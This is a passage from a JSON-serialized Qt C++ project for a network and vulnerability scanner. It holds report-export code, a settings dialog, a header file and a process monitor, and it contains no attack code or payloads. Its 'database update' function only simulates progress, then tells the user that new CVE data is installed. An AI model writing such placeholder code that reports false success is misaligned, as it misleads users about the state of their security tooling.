<div class=\"detail-value\">)\" << vuln.discovered.toString(\"dd.MM.yyyy hh:mm\") << R\"(</div>\r\n                    </div>\r\n                </div>\r\n\r\n                <p><strong>Description:</strong> )\" << vuln.description << R\"(</p>\r\n                <p><strong>Evidence:</strong> )\" << vuln.evidence << R\"(</p>\r\n\r\n                <div class=\"recommendation\">\r\n                    <h4>💡 Recommendation:</h4>\r\n                    <p>)\" << vuln.recommendation << R\"(</p>\r\n                </div>\r\n\r\n                <div class=\")\" << (vuln.exploitable ? \"exploitable\" : \"not-exploitable\") << R\"(\">\r\n                    <strong>Exploitability:</strong> )\" << (vuln.exploitable ? \"⚠️ EXPLOITABLE\" : \"✅ Not Exploitable\") << R\"(\r\n                    )\" << (vuln.exploitable && !vuln.exploitMethod.isEmpty() ?\r\n                       QString(\"<br><strong>Method:</strong> %1\").arg(vuln.exploitMethod) : \"\") << R\"(\r\n                </div>\r\n\r\n                )\" << (!vuln.references.isEmpty() ?\r\n                       QString(\"<p><strong>References:</strong> %1</p>\").arg(vuln.references.join(\", \")) : \"\") << R\"(\r\n            </div>)\";\r\n    }\r\n\r\n    stream << R\"(\r\n        </div>\r\n\r\n        <div class=\"footer\">\r\n            <p>Report generated by Advanced IP Scanner v2.0 - Vulnerability Assessment Module</p>\r\n            <p>Generated on )\" << reportTime.toString(\"dd.MM.yyyy hh:mm:ss\") << R\"( | Total Scan Time: )\" <<\r\n        (lastAssessment.scanTime.isValid() ?\r\n             QString(\"%1 seconds\").arg(lastAssessment.scanTime.secsTo(reportTime)) : \"Unknown\") << R\"(</p>\r\n            <p><em>This report contains sensitive security information. Handle with care.</em></p>\r\n        </div>\r\n    </div>\r\n</body>\r\n</html>)\";\r\n}\r\n\r\nvoid IpScanner::generateJSONVulnerabilityReport(QTextStream &stream)\r\n{\r\n    QJsonObject root;\r\n    root[\"scanner\"] = \"Advanced IP Scanner\";\r\n    root[\"module\"] = \"Vulnerability Assessment\";\r\n    root[\"version\"] = \"2.0\";\r\n    root[\"timestamp\"] = QDateTime::currentDateTime().toString(Qt::ISODate);\r\n    root[\"target\"] = vulnTargetEdit->text();\r\n\r\n    // Assessment summary\r\n    QJsonObject assessmentObj;\r\n    assessmentObj[\"totalVulnerabilities\"] = lastAssessment.totalVulnerabilities;\r\n    assessmentObj[\"criticalCount\"] = lastAssessment.criticalCount;\r\n    assessmentObj[\"highCount\"] = lastAssessment.highCount;\r\n    assessmentObj[\"mediumCount\"] = lastAssessment.mediumCount;\r\n    assessmentObj[\"lowCount\"] = lastAssessment.lowCount;\r\n    assessmentObj[\"infoCount\"] = lastAssessment.infoCount;\r\n    assessmentObj[\"securityScore\"] = lastAssessment.securityScore;\r\n    assessmentObj[\"overallRisk\"] = lastAssessment.overallRisk;\r\n    assessmentObj[\"operatingSystem\"] = lastAssessment.operatingSystem;\r\n    assessmentObj[\"hasWeakCredentials\"] = lastAssessment.hasWeakCredentials;\r\n    assessmentObj[\"hasUnencryptedServices\"] = lastAssessment.hasUnencryptedServices;\r\n    assessmentObj[\"hasOutdatedSoftware\"] = lastAssessment.hasOutdatedSoftware;\r\n\r\n    QJsonArray servicesArray;\r\n    for (const QString &service : lastAssessment.runningServices) {\r\n        servicesArray.append(service);\r\n    }\r\n    assessmentObj[\"runningServices\"] = servicesArray;\r\n\r\n    root[\"assessment\"] = assessmentObj;\r\n\r\n    // Individual vulnerabilities\r\n    QJsonArray vulnerabilitiesArray;\r\n    for (const VulnerabilityInfo &vuln : discoveredVulnerabilities) {\r\n        QJsonObject vulnObj;\r\n        vulnObj[\"id\"] = vuln.id;\r\n        vulnObj[\"title\"] = vuln.title;\r\n        vulnObj[\"description\"] = vuln.description;\r\n        vulnObj[\"severity\"] = static_cast<int>(vuln.severity);\r\n        vulnObj[\"severityText\"] = [](VulnSeverity sev) {\r\n            switch (sev) {\r\n            case VulnSeverity::CRITICAL: return \"CRITICAL\";\r\n            case VulnSeverity::HIGH: return \"HIGH\";\r\n            case VulnSeverity::MEDIUM: return \"MEDIUM\";\r\n            case VulnSeverity::LOW: return \"LOW\";\r\n            case VulnSeverity::INFO: return \"INFO\";\r\n            }\r\n            return \"UNKNOWN\";\r\n        }(vuln.severity);\r\n        vulnObj[\"service\"] = vuln.service;\r\n        vulnObj[\"port\"] = vuln.port;\r\n        vulnObj[\"evidence\"] = vuln.evidence;\r\n        vulnObj[\"recommendation\"] = vuln.recommendation;\r\n        vulnObj[\"discovered\"] = vuln.discovered.toString(Qt::ISODate);\r\n        vulnObj[\"cveScore\"] = vuln.cveScore;\r\n        vulnObj[\"exploitable\"] = vuln.exploitable;\r\n        vulnObj[\"exploitMethod\"] = vuln.exploitMethod;\r\n\r\n        QJsonArray referencesArray;\r\n        for (const QString &ref : vuln.references) {\r\n            referencesArray.append(ref);\r\n        }\r\n        vulnObj[\"references\"] = referencesArray;\r\n\r\n        vulnerabilitiesArray.append(vulnObj);\r\n    }\r\n\r\n    root[\"vulnerabilities\"] = vulnerabilitiesArray;\r\n\r\n    QJsonDocument doc(root);\r\n    stream << doc.toJson();\r\n}\r\nvoid IpScanner::showVulnerabilitySettings()\r\n{\r\n    QDialog *settingsDialog = new QDialog(this);\r\n    settingsDialog->setWindowTitle(\"⚙️ Vulnerability Scanner Einstellungen\");\r\n    settingsDialog->setModal(true);\r\n    settingsDialog->resize(500, 400);\r\n    settingsDialog->setStyleSheet(styleSheet());\r\n\r\n    QVBoxLayout *layout = new QVBoxLayout(settingsDialog);\r\n\r\n    // Scan Settings Group\r\n    QGroupBox *scanGroup = new QGroupBox(\"🔍 Scan Einstellungen\");\r\n    QFormLayout *scanLayout = new QFormLayout(scanGroup);\r\n\r\n    QSpinBox *defaultTimeoutSpinBox = new QSpinBox();\r\n    defaultTimeoutSpinBox->setRange(1000, 30000);\r\n    defaultTimeoutSpinBox->setValue(vulnTimeoutSpinBox->value());\r\n    defaultTimeoutSpinBox->setSuffix(\" ms\");\r\n    scanLayout->addRow(\"Standard Timeout:\", defaultTimeoutSpinBox);\r\n\r\n    QCheckBox *autoStartAfterPortScan = new QCheckBox(\"Nach Port-Scan automatisch starten\");\r\n    scanLayout->addRow(autoStartAfterPortScan);\r\n\r\n    QCheckBox *showDetailedProgress = new QCheckBox(\"Detaillierten Fortschritt anzeigen\");\r\n    showDetailedProgress->setChecked(true);\r\n    scanLayout->addRow(showDetailedProgress);\r\n\r\n    // Report Settings Group\r\n    QGroupBox *reportGroup = new QGroupBox(\"📊 Report Einstellungen\");\r\n    QFormLayout *reportLayout = new QFormLayout(reportGroup);\r\n\r\n    QComboBox *defaultReportFormat = new QComboBox();\r\n    defaultReportFormat->addItems({\"HTML Report\", \"JSON Data\", \"PDF Report\"});\r\n    reportLayout->addRow(\"Standard Export Format:\", defaultReportFormat);\r\n\r\n    QCheckBox *autoExportOnComplete = new QCheckBox(\"Report automatisch exportieren\");\r\n    reportLayout->addRow(autoExportOnComplete);\r\n\r\n    QCheckBox *includeRecommendations = new QCheckBox(\"Empfehlungen einschließen\");\r\n    includeRecommendations->setChecked(true);\r\n    reportLayout->addRow(includeRecommendations);\r\n\r\n    // Buttons\r\n    QHBoxLayout *buttonLayout = new QHBoxLayout();\r\n    QPushButton *okButton = new QPushButton(\"✅ OK\");\r\n    QPushButton *cancelButton = new QPushButton(\"❌ Abbrechen\");\r\n    QPushButton *resetButton = new QPushButton(\"🔄 Zurücksetzen\");\r\n\r\n    buttonLayout->addWidget(resetButton);\r\n    buttonLayout->addStretch();\r\n    buttonLayout->addWidget(okButton);\r\n    buttonLayout->addWidget(cancelButton);\r\n\r\n    layout->addWidget(scanGroup);\r\n    layout->addWidget(reportGroup);\r\n    layout->addLayout(buttonLayout);\r\n\r\n    connect(okButton, &QPushButton::clicked, [=]() {\r\n        vulnTimeoutSpinBox->setValue(defaultTimeoutSpinBox->value());\r\n        settingsDialog->accept();\r\n        addLogEntry(\"Vulnerability Scanner Einstellungen aktualisiert\", \"SUCCESS\");\r\n    });\r\n\r\n    connect(cancelButton, &QPushButton::clicked, settingsDialog, &QDialog::reject);\r\n\r\n    connect(resetButton, &QPushButton::clicked, [=]() {\r\n        defaultTimeoutSpinBox->setValue(5000);\r\n        autoStartAfterPortScan->setChecked(false);\r\n        showDetailedProgress->setChecked(true);\r\n        defaultReportFormat->setCurrentIndex(0);\r\n        autoExportOnComplete->setChecked(false);\r\n        includeRecommendations->setChecked(true);\r\n    });\r\n\r\n    settingsDialog->exec();\r\n}\r\n\r\nvoid IpScanner::updateVulnerabilityDatabase()\r\n{\r\n    QProgressDialog *progressDialog = new QProgressDialog(\"Aktualisiere Vulnerability Datenbank...\", \"Abbrechen\", 0, 100, this);\r\n    progressDialog->setWindowModality(Qt::WindowModal);\r\n    progressDialog->setStyleSheet(styleSheet());\r\n    progressDialog->show();\r\n\r\n    // Simulate database update (in real implementation, this would download CVE data)\r\n    for (int i = 0; i <= 100; i += 10) {\r\n        progressDialog->setValue(i);\r\n        QThread::msleep(200);\r\n        QApplication::processEvents();\r\n\r\n        if (progressDialog->wasCanceled()) {\r\n            addLogEntry(\"Vulnerability Datenbank Update abgebrochen\", \"WARNING\");\r\n            return;\r\n        }\r\n    }\r\n\r\n    progressDialog->close();\r\n    addLogEntry(\"Vulnerability Datenbank erfolgreich aktualisiert\", \"SUCCESS\");\r\n    QMessageBox::information(this, \"✅ Update Erfolgreich\",\r\n                             \"Vulnerability Datenbank wurde erfolgreich aktualisiert!\\n\\n\"\r\n                             \"Neue CVE-Einträge und Vulnerability-Signaturen sind jetzt verfügbar.\");\r\n}\r\nvoid IpScanner::initializeVulnerabilityScanner()\r\n{\r\n    vulnerabilityScanRunning = false;\r\n    discoveredVulnerabilities.clear();\r\n\r\n    // Initialize vulnerability database\r\n    VulnerabilityDatabase::instance()->updateDatabase();\r\n}\r\n",
          "relativePath": "ipscanner.cpp"
        },
        {
          "name": "ipscanner.h",
          "type": "file",
          "content": "#ifndef IPSCANNER_H\r\n#define IPSCANNER_H\r\n\r\n#include <QtWidgets/QMainWindow>\r\n#include <QtWidgets/QVBoxLayout>\r\n#include <QtWidgets/QHBoxLayout>\r\n#include <QtWidgets/QGridLayout>\r\n#include <QtWidgets/QFormLayout>\r\n#include <QtWidgets/QTabWidget>\r\n#include <QtWidgets/QTreeWidget>\r\n#include <QtWidgets/QTreeWidgetItem>\r\n#include <QtWidgets/QPushButton>\r\n#include <QtWidgets/QLabel>\r\n#include <QtWidgets/QLineEdit>\r\n#include <QtWidgets/QSpinBox>\r\n#include <QtWidgets/QProgressBar>\r\n#include <QtWidgets/QTextEdit>\r\n#include <QtWidgets/QComboBox>\r\n#include <QtWidgets/QCheckBox>\r\n#include <QtWidgets/QGroupBox>\r\n#include <QtWidgets/QListWidget>\r\n#include <QtWidgets/QSplitter>\r\n#include <QtWidgets/QMenuBar>\r\n#include <QtWidgets/QMenu>\r\n#include <QtGui/QAction>\r\n#include <QtWidgets/QStatusBar>\r\n#include <QtWidgets/QFileDialog>\r\n#include <QtCore/QMap>\r\n#include <QtCore/QSet>\r\n#include <QtWidgets/QApplication>\r\n#include <QtWidgets/QMessageBox>\r\n#include <QtWidgets/QDialog>\r\n#include <QtCore/QTimer>\r\n#include <QtCore/QThread>\r\n#include <QtCore/QThreadPool>\r\n#include <QtCore/QRunnable>\r\n#include <QtCore/QMutex>\r\n#include <QtNetwork/QTcpSocket>\r\n#include <QtNetwork/QHostInfo>\r\n#include <QtNetwork/QNetworkInterface>\r\n#include <QtNetwork/QUdpSocket>\r\n#include <QtCore/QDateTime>\r\n#include <QtCore/QJsonObject>\r\n#include <QtCore/QJsonArray>\r\n#include <QtCore/QJsonDocument>\r\n#include <QtCore/QSettings>\r\n#include <QtCore/QElapsedTimer>\r\n#include <QtGui/QClipboard>\r\n#include <QtCore/QUrl>\r\n#include <QtGui/QDesktopServices>\r\n#include \"ScanWorkers.h\"\r\n#include \"VulnerabilityScanner.h\"\r\n\r\n// Forward declarations\r\nclass ScanWorker;\r\nclass PortScanWorker;\r\nclass PingWorker;\r\nclass EnhancedArpScanWorker;\r\nclass NetworkHealthWorker;\r\nclass VulnerabilityScanner;\r\n\r\nclass IpScanner : public QMainWindow\r\n{\r\n    Q_OBJECT\r\n\r\npublic:\r\n    IpScanner(QWidget *parent = nullptr);\r\n    ~IpScanner();\r\n\r\nprivate slots:\r\n    // Main scanning functions\r\n    void startScan();\r\n    void stopScan();\r\n    void pauseScan();\r\n    void resumeScan();\r\n\r\n    // Host discovery\r\n    void pingHost();\r\n    void traceroute();\r\n    void dnsLookup();\r\n\r\n    // Port scanning\r\n    void portScan();\r\n    void vulnScan();\r\n    void serviceScan();\r\n\r\n    // Network analysis\r\n    void networkDiscovery();\r\n    void arpScan();\r\n    void whoIs();\r\n\r\n    // Results handling\r\n    void onHostFound(const HostInfo &host);\r\n    void onHostCompleted();  // New: for progress tracking\r\n    void updateProgress();   // New: for UI updates\r\n    void updateScanProgress(); // New: for scan progress\r\n    void onScanFinished();\r\n    void onItemSelectionChanged();\r\n    void onItemDoubleClicked(QTreeWidgetItem *item, int column);\r\n\r\n    void analyzeNetworkTopology();\r\n    void exportNetworkMap();\r\n    void refreshNetworkInterfaces();\r\n    void showNetworkStatistics();\r\n    void performNetworkHealthCheck();\r\n    void updateNetworkStatistics();\r\n\r\n    void showMacLookup();\r\n    void showSubnetCalculator();\r\n\r\n    // Export/Import\r\n    void exportResults();\r\n    void saveProject();\r\n    void loadProject();\r\n\r\n    // Settings and UI\r\n    void showSettings();\r\n    void showAbout();\r\n    void showShortcuts();  // New: show keyboard shortcuts\r\n\r\n    // Context menu and actions\r\n    void showContextMenu(const QPoint &pos);\r\n    void copyToClipboard();\r\n    void removeHost();\r\n    void addToFavorites();\r\n\r\n    void showNetworkContextMenu(const QPoint &pos);\r\n    void showNetworkDeviceDetails(QTreeWidgetItem *item);\r\n\r\n    // New utility functions\r\n    void addCommonPort();\r\n    void filterLog();\r\n    void saveLog();\r\n\r\n    // Vulnerability Scanner functions\r\n    void startVulnerabilitySccan();\r\n    void stopVulnerabilitySccan();\r\n    void exportVulnerabilityReport();\r\n    void clearVulnerabilityResults();\r\n    void showVulnerabilitySettings();\r\n    void updateVulnerabilityDatabase();\r\n    void onVulnerabilitySelectionChanged();\r\n    void onVulnerabilityScanProgress(const QString &target, int percentage);\r\n    void onVulnerabilityScanStatusUpdate(const QString &target, const QString &message);\r\n    void onVulnerabilityFound(const QString &target, const VulnerabilityInfo &vuln);\r\n    void onSecurityAssessmentComplete(const SecurityAssessment &assessment);\r\n\r\nprivate:\r\n    void setupUI();\r\n    void setupMenuBar();\r\n    void setupToolBar();\r\n    void setupStatusBar();\r\n    void createScanTab();\r\n    void createResultsTab();\r\n    void createPortScanTab();\r\n    void createNetworkTab();\r\n    void createLogTab();\r\n    void createVulnerabilityTab();\r\n\r\n    QString resolveHostnameWithTimeout(const QString &ip, int timeoutMs);\r\n    QColor getVendorColor(const QString &vendor);\r\n\r\n    QStringList parseCIDRRange(const QString &cidrNotation);\r\n    QStringList parseIPRange(const QString &rangeString);\r\n    QStringList parseWildcardRange(const QString &wildcardString);\r\n    QStringList generateIPRange(const QString &startIP, const QString &endPart);\r\n    quint32 ipToInt(const QString &ip);\r\n    QString intToIP(quint32 ip);\r\n    bool isValidIP(const QString &ip);\r\n\r\n    // Helper functions\r\n    void loadSettings();\r\n    void saveSettings();\r\n    void addLogEntry(const QString &message, const QString &type = \"INFO\");\r\n    QString getCurrentNetwork();\r\n    QStringList getLocalInterfaces();\r\n    void populateHostTree();\r\n    void clearResults();\r\n\r\n    QString resolveHostname(const QString &ip);\r\n    QString getMacVendor(const QString &mac);\r\n    QString getSubnetFromIp(const QString &ip);\r\n    bool isLikelyRouter(const HostInfo &host);\r\n    bool isLikelyServer(const HostInfo &host);\r\n    bool isLikelyWorkstation(const HostInfo &host);\r\n    void setupNetworkContextMenu();\r\n\r\n    // Enhanced parsing functions\r\n    QStringList parseTargetString(const QString &target);\r\n    QList<int> parsePortRange(const QString &range);\r\n    QJsonDocument createJsonReport();\r\n\r\n    QString calculateSubnetInfo(const QString &ip, int cidr);\r\n    QString getNetworkClass(quint32 networkAddr);\r\n    QString getSubnetType(int cidr);\r\n\r\n    // Vulnerability report generation\r\n    void generateVulnerabilityReport(const QString &fileName);\r\n    void generateHTMLVulnerabilityReport(QTextStream &stream);\r\n    void generateJSONVulnerabilityReport(QTextStream &stream);\r\n    void initializeVulnerabilityScanner();\r\n\r\n    // UI Components\r\n    QWidget *centralWidget;\r\n    QTabWidget *mainTabWidget;\r\n    QSplitter *mainSplitter;\r\n\r\n    QList<QLabel*> networkStatsLabels;\r\n\r\n    // Scan Tab - Enhanced\r\n    QWidget *scanTab;\r\n    QLineEdit *targetEdit;\r\n    QSpinBox *threadsSpinBox;\r\n    QSpinBox *timeoutSpinBox;\r\n    QComboBox *scanTypeCombo;\r\n    QCheckBox *pingCheckBox;\r\n    QCheckBox *portScanCheckBox;\r\n    QCheckBox *osDetectionCheckBox;\r\n    QCheckBox *serviceDetectionCheckBox;\r\n    QPushButton *startButton;\r\n    QPushButton *stopButton;\r\n    QPushButton *pauseButton;\r\n    QProgressBar *progressBar;\r\n    QLabel *statusLabel;\r\n\r\n    // New progress indicators\r\n    QLabel *currentHostLabel;\r\n    QLabel *totalHostsLabel;\r\n    QLabel *scannedHostsLabel;\r\n    QLabel *foundHostsLabel;\r\n    QLabel *elapsedTimeLabel;\r\n\r\n    // Results Tab\r\n    QWidget *resultsTab;\r\n    QTreeWidget *hostTreeWidget;\r\n    QTextEdit *hostDetailsEdit;\r\n\r\n    // Port Scan Tab\r\n    QWidget *portScanTab;\r\n    QLineEdit *portRangeEdit;\r\n    QComboBox *portScanTypeCombo;\r\n    QListWidget *commonPortsList;\r\n    QPushButton *portScanButton;\r\n    QTreeWidget *portResultsTree;\r\n\r\n    // Network Tab\r\n    QWidget *networkTab;\r\n    QComboBox *interfaceCombo;\r\n    QTreeWidget *networkTree;\r\n    QPushButton *arpScanButton;\r\n    QPushButton *discoveryButton;\r\n\r\n    // Log Tab - Enhanced\r\n    QWidget *logTab;\r\n    QTextEdit *logTextEdit;\r\n    QPushButton *clearLogButton;\r\n    QPushButton *saveLogButton;\r\n    QPushButton *exportLogButton;  // New\r\n    QLineEdit *logFilterEdit;      // New\r\n\r\n    // Vulnerability Scanner Tab\r\n    QWidget *vulnerabilityTab;\r\n    QLineEdit *vulnTargetEdit;\r\n    QComboBox *vulnScanTypeCombo;\r\n    QSpinBox *vulnTimeoutSpinBox;\r\n    QCheckBox *enableCredentialTestsCheckBox;\r\n    QCheckBox *enableSSLTestsCheckBox;\r\n    QCheckBox *enableServiceTestsCheckBox;\r\n    QPushButton *startVulnScanButton;\r\n    QPushButton *stopVulnScanButton;\r\n    QPushButton *exportVulnReportButton;\r\n    QProgressBar *vulnerabilityProgressBar;\r\n    QLabel *vulnerabilityStatusLabel;\r\n    QLabel *vulnerabilitiesFoundLabel;\r\n    QLabel *securityScoreLabel;\r\n    QLabel *riskLevelLabel;\r\n    QTreeWidget *vulnerabilityTreeWidget;\r\n    QTextEdit *vulnerabilityDetailsEdit;\r\n\r\n    // Menu and toolbar\r\n    QMenu *fileMenu;\r\n    QMenu *scanMenu;\r\n    QMenu *toolsMenu;\r\n    QMenu *helpMenu;\r\n\r\n    // Actions\r\n    QAction *newProjectAction;\r\n    QAction *openProjectAction;\r\n    QAction *saveProjectAction;\r\n    QAction *exportAction;\r\n    QAction *exitAction;\r\n    QAction *settingsAction;\r\n    QAction *aboutAction;\r\n\r\n    // Data members\r\n    QList<HostInfo> discoveredHosts;\r\n    QThreadPool *threadPool;\r\n    QTimer *updateTimer;      // New: for UI updates\r\n    QTimer *progressTimer;    // New: for progress updates\r\n    QSettings *settings;\r\n    QString currentTarget;\r\n    bool scanRunning;\r\n    bool scanPaused;\r\n    int totalHosts;\r\n    int scannedHosts;\r\n    int completedHosts;       // New: for accurate progress tracking\r\n    QMutex hostListMutex;\r\n    QDateTime scanStartTime;  // New: for elapsed time tracking\r\n\r\n    // Vulnerability scanner data\r\n    bool vulnerabilityScanRunning;\r\n    QList<VulnerabilityInfo> discoveredVulnerabilities;\r\n    SecurityAssessment lastAssessment;\r\n\r\n    // Scan workers\r\n    QList<QThread*> scanThreads;\r\n};\r\n\r\n#endif // IPSCANNER_H\r\n",
          "relativePath": "ipscanner.h"
        },
        {
          "name": "IpScanner.pro",
          "type": "file",
          "relativePath": "IpScanner.pro"
        },
        {
          "name": "IpScanner.pro.user",
          "type": "file",
          "relativePath": "IpScanner.pro.user"
        },
        {
          "name": "main.cpp",
          "type": "file",
          "content": "#include <QtWidgets/QApplication>\r\n#include <QtCore/QDir>\r\n#include <QtCore/QStandardPaths>\r\n#include \"IpScanner.h\"\r\n\r\nint main(int argc, char *argv[])\r\n{\r\n    QApplication app(argc, argv);\r\n\r\n    // Set application properties\r\n    app.setApplicationName(\"Advanced IP Scanner\");\r\n    app.setApplicationVersion(\"2.0\");\r\n    app.setOrganizationName(\"NetworkTools\");\r\n    app.setOrganizationDomain(\"networktools.com\");\r\n\r\n    // Set application icon if available\r\n    app.setWindowIcon(QIcon(\":/icons/scanner.png\"));\r\n\r\n    // Create main window\r\n    IpScanner scanner;\r\n    scanner.show();\r\n\r\n    return app.exec();\r\n}\r\n",
          "relativePath": "main.cpp"
        },
        {
          "name": "mainwindow.cpp",
          "type": "file",
          "content": "#include \"mainwindow.h\"\r\n#include \"ui_mainwindow.h\"\r\n\r\nMainWindow::MainWindow(QWidget *parent)\r\n    : QMainWindow(parent)\r\n    , ui(new Ui::MainWindow)\r\n{\r\n    ui->setupUi(this);\r\n}\r\n\r\nMainWindow::~MainWindow()\r\n{\r\n    delete ui;\r\n}\r\n",
          "relativePath": "mainwindow.cpp"
        },
        {
          "name": "mainwindow.h",
          "type": "file",
          "content": "#ifndef MAINWINDOW_H\r\n#define MAINWINDOW_H\r\n\r\n#include <QMainWindow>\r\n\r\nQT_BEGIN_NAMESPACE\r\nnamespace Ui {\r\nclass MainWindow;\r\n}\r\nQT_END_NAMESPACE\r\n\r\nclass MainWindow : public QMainWindow\r\n{\r\n    Q_OBJECT\r\n\r\npublic:\r\n    MainWindow(QWidget *parent = nullptr);\r\n    ~MainWindow();\r\n\r\nprivate:\r\n    Ui::MainWindow *ui;\r\n};\r\n#endif // MAINWINDOW_H\r\n",
          "relativePath": "mainwindow.h"
        },
        {
          "name": "mainwindow.ui",
          "type": "file",
          "relativePath": "mainwindow.ui"
        },
        {
          "name": "processmonitor.cpp",
          "type": "file",
          "content": "#include \"ProcessMonitor.h\"\r\n#include <QtCore/QDebug>\r\n#include <QtCore/QDir>\r\n#include <QtCore/QTextStream>\r\n#include <QStatusBar>\r\n#include <QRegularExpression>\r\n\r\nProcessMonitor::ProcessMonitor(QWidget *parent)\r\n    : QMainWindow(parent)\r\n{\r\n    setupUI();\r\n\r\n    // Auto-refresh timer (every 5 seconds)\r\n    autoRefreshTimer = new QTimer(this);\r\n    connect(autoRefreshTimer, &QTimer::timeout, this, &ProcessMonitor::refreshProcessList);\r\n    autoRefreshTimer->start(5000);\r\n\r\n    // Initial population\r\n    refreshProcessList();\r\n}\r\n\r\nProcessMonitor::~ProcessMonitor()\r\n{\r\n    if (autoRefreshTimer) {\r\n        autoRefreshTimer->stop();\r\n    }\r\n}\r\n\r\nvoid ProcessMonitor::setupUI()\r\n{\r\n    // Central widget setup\r\n    centralWidget = new QWidget(this);\r\n    setCentralWidget(centralWidget);\r\n\r\n    // Main layout\r\n    mainLayout = new QVBoxLayout(centralWidget);\r\n\r\n    // Title\r\n    titleLabel = new QLabel(\"Prozess Monitor\", this);\r\n    titleLabel->setStyleSheet(\"font-size: 18px; font-weight: bold; margin: 10px;\");\r\n    titleLabel->setAlignment(Qt::AlignCenter);\r\n\r\n    // Filter layout\r\n    filterLayout = new QHBoxLayout();\r\n    QLabel *filterLabel = new QLabel(\"Filter:\", this);\r\n    filterEdit = new QLineEdit(this);\r\n    filterEdit->setPlaceholderText(\"Prozessname eingeben...\");\r\n    filterLayout->addWidget(filterLabel);\r\n    filterLayout->addWidget(filterEdit);\r\n\r\n    // Process list\r\n    processListWidget = new QListWidget(this);\r\n    processListWidget->setSelectionMode(QAbstractItemView::SingleSelection);\r\n\r\n    // Button layout\r\n    buttonLayout = new QHBoxLayout();\r\n    refreshButton = new QPushButton(\"Aktualisieren\", this);\r\n    killButton = new QPushButton(\"Prozess beenden\", this);\r\n    exitButton = new QPushButton(\"Beenden\", this);\r\n\r\n    killButton->setStyleSheet(\"background-color: #ff6b6b; color: white;\");\r\n    refreshButton->setStyleSheet(\"background-color: #4ecdc4; color: white;\");\r\n\r\n    buttonLayout->addWidget(refreshButton);\r\n    buttonLayout->addWidget(killButton);\r\n    buttonLayout->addStretch();\r\n    buttonLayout->addWidget(exitButton);\r\n\r\n    // Add to main layout\r\n    mainLayout->addWidget(titleLabel);\r\n    mainLayout->addLayout(filterLayout);\r\n    mainLayout->addWidget(processListWidget);\r\n    mainLayout->addLayout(buttonLayout);\r\n\r\n    // Connect signals\r\n    connect(refreshButton, &QPushButton::clicked, this, &ProcessMonitor::refreshProcessList);\r\n    connect(killButton, &QPushButton::clicked, this, &ProcessMonitor::killSelectedProcess);\r\n    connect(exitButton, &QPushButton::clicked, this, &QWidget::close);\r\n    connect(filterEdit, &QLineEdit::textChanged, this, &ProcessMonitor::filterProcesses);\r\n    connect(processListWidget, &QListWidget::itemDoubleClicked, this, &ProcessMonitor::onProcessDoubleClicked);\r\n\r\n    // Window properties\r\n    setWindowTitle(\"Qt Prozess Monitor\");\r\n    setMinimumSize(600, 400);\r\n    resize(800, 600);\r\n}\r\n\r\nvoid ProcessMonitor::refreshProcessList()\r\n{\r\n    allProcesses = getRunningProcesses();\r\n    populateProcessList();\r\n}\r\n\r\nvoid ProcessMonitor::populateProcessList()\r\n{\r\n    processListWidget->clear();\r\n\r\n    QString filterText = filterEdit->text().toLower();\r\n\r\n    for (const QString &process : allProcesses) {\r\n        if (filterText.isEmpty() || process.toLower().contains(filterText)) {\r\n            processListWidget->addItem(process);\r\n        }\r\n    }\r\n\r\n    // Update status\r\n    QString statusText = QString(\"Prozesse gefunden: %1\").arg(processListWidget->count());\r\n    if (!filterEdit->text().isEmpty()) {\r\n        statusText += QString(\" (gefiltert von %1)\").arg(allProcesses.size());\r\n    }\r\n\r\n    // Create status bar if it doesn't exist\r\n    if (!statusBar()) {\r\n        setStatusBar(new QStatusBar(this));\r\n    }\r\n    statusBar()->showMessage(statusText);\r\n}\r\n\r\nQStringList ProcessMonitor::getRunningProcesses()\r\n{\r\n    QStringList processes;\r\n\r\n#ifdef Q_OS_WIN\r\n    // Windows: Use tasklist command\r\n    QProcess process;\r\n    process.start(\"tasklist\", QStringList() << \"/fo\" << \"csv\" << \"/nh\");\r\n    process.waitForFinished();\r\n\r\n    QString output = process.readAllStandardOutput();\r\n    QStringList lines = output.split('\\n');\r\n\r\n    for (const QString &line : lines) {\r\n        if (!line.isEmpty()) {\r\n            QStringList parts = line.split(',');\r\n            if (parts.size() >= 2) {\r\n                QString processName = parts[0].remove('\"');\r\n                QString pid = parts[1].remove('\"');\r\n                processes.append(QString(\"%1 (PID: %2)\").arg(processName, pid));\r\n            }\r\n        }\r\n    }\r\n#else\r\n    // Linux/Unix: Use ps command\r\n    QProcess process;\r\n    process.start(\"ps\", QStringList() << \"aux\");\r\n    process.waitForFinished();\r\n\r\n    QString output = process.readAllStandardOutput();\r\n    QStringList lines = output.split('\\n');\r\n\r\n    for (int i = 1; i < lines.size(); ++i) { // Skip header\r\n        QString line = lines[i].simplified();\r\n        if (!line.isEmpty()) {\r\n            QStringList parts = line.split(' ');\r\n            if (parts.size() >= 11) {\r\n                QString pid = parts[1];\r\n                QString command = parts.mid(10).join(' ');\r\n                processes.append(QString(\"%1 (PID: %2)\").arg(command, pid));\r\n            }\r\n        }\r\n    }\r\n#endif\r\n\r\n    return processes;\r\n}\r\n\r\nvoid ProcessMonitor::killSelectedProcess()\r\n{\r\n    QListWidgetItem *currentItem = processListWidget->currentItem();\r\n    if (!currentItem) {\r\n        QMessageBox::warning(this, \"Warnung\", \"Bitte wählen Sie einen Prozess aus!\");\r\n        return;\r\n    }\r\n\r\n    QString processText = currentItem->text();\r\n\r\n    // Extract PID from the process text\r\n    QRegularExpression pidRegex(\"PID: (\\\\d+)\");\r\n    QRegularExpressionMatch match = pidRegex.match(processText);\r\n    if (!match.hasMatch()) {\r\n        QMessageBox::warning(this, \"Fehler\", \"Konnte PID nicht extrahieren!\");\r\n        return;\r\n    }\r\n\r\n    QString pid = match.captured(1);\r\n\r\n    // Confirmation dialog\r\n    int ret = QMessageBox::question(this, \"Prozess beenden\",\r\n                                    QString(\"Möchten Sie den Prozess mit PID %1 wirklich beenden?\").arg(pid),\r\n                                    QMessageBox::Yes | QMessageBox::No);\r\n\r\n    if (ret == QMessageBox::Yes) {\r\n        QProcess killProcess;\r\n\r\n#ifdef Q_OS_WIN\r\n        killProcess.start(\"taskkill\", QStringList() << \"/PID\" << pid << \"/F\");\r\n#else\r\n        killProcess.start(\"kill\", QStringList() << \"-9\" << pid);\r\n#endif\r\n\r\n        killProcess.waitForFinished();\r\n\r\n        if (killProcess.exitCode() == 0) {\r\n            QMessageBox::information(this, \"Erfolg\", \"Prozess wurde beendet!\");\r\n            refreshProcessList();\r\n        } else {\r\n            QMessageBox::warning(this, \"Fehler\", \"Prozess konnte nicht beendet werden!\");\r\n        }\r\n    }\r\n}\r\n\r\nvoid ProcessMonitor::filterProcesses(const QString &text)\r\n{\r\n    Q_UNUSED(text)\r\n    populateProcessList();\r\n}\r\n\r\nvoid 